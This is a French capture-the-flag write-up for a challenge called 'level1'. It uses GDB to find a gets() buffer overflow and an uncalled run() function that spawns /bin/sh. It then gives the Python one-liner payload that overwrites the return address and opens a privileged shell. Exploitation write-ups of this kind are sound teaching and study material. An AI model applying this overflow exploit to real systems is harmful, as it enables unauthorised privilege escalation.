## Level1

### Analyse
L'analyse du binaire via GDB révèle une faille de type Buffer Overflow dans la fonction main. Le programme réserve un buffer de 80 octets (sub esp, 0x50) et utilise la fonction non sécurisée gets, qui ne vérifie pas la taille de l'entrée. En listant les fonctions, on découvre une fonction run située à l'adresse 0x08048444 qui n'est jamais appelée. Le désassemblage de run montre qu'elle appelle system("/bin/sh"), ce qui permet d'obtenir un shell avec des privilèges élevés.

```bash
$ gdb level1
(gdb) disas main
   ...
   0x08048486 <+6>:     sub    esp,0x50  # Réservation de 80 octets
   ...
```

```bash
(gdb) info function
   ...
   0x08048444  run
```

```bash
(gdb) disas run
    ...
   0x08048479 <+53>:	call   0x8048360 <system@plt> # appel system
    ...
```

```bash
(gdb) x/s 0x8048584
0x8048584:	 "/bin/sh"
```


### Exploitation
L'objectif est d'écraser l'adresse de retour (EIP) sur la pile pour rediriger l'exécution vers la fonction run. On remplit le buffer avec 76 caractères de "padding", suivis de l'adresse de run au format Little Endian (\x44\x84\x04\x08). L'utilisation du - avec cat permet de garder le flux ouvert pour interagir avec le shell une fois l'exploit réussi.

```bash
$ python -c 'print "42"*38 + "\x44\x84\x04\x08"' > /tmp/payload
$ cat /tmp/payload -| ./level1

Good... Wait what?
```
